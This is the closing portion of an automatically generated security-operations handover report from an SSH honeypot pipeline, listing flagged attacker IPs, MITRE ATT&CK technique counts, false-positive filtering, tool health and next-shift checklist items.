| `183.3.133[.]47` | CN | CHINANET Guangdong province network | **100** ⚠️ | 29 |
| `211.43.107[.]179` | KR | Korea Telecom | **100** ⚠️ | 5 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 37 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 22 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 10 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |

---

## 🔕 False Positive Summary (14 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 10 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 49 cases |
| Tool 34  | Credential Extractor        | ✅ 32 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 38 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 14 filtered (28.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 29 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 10 priority case(s) shown individually · 25 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-27T18:53:45Z_
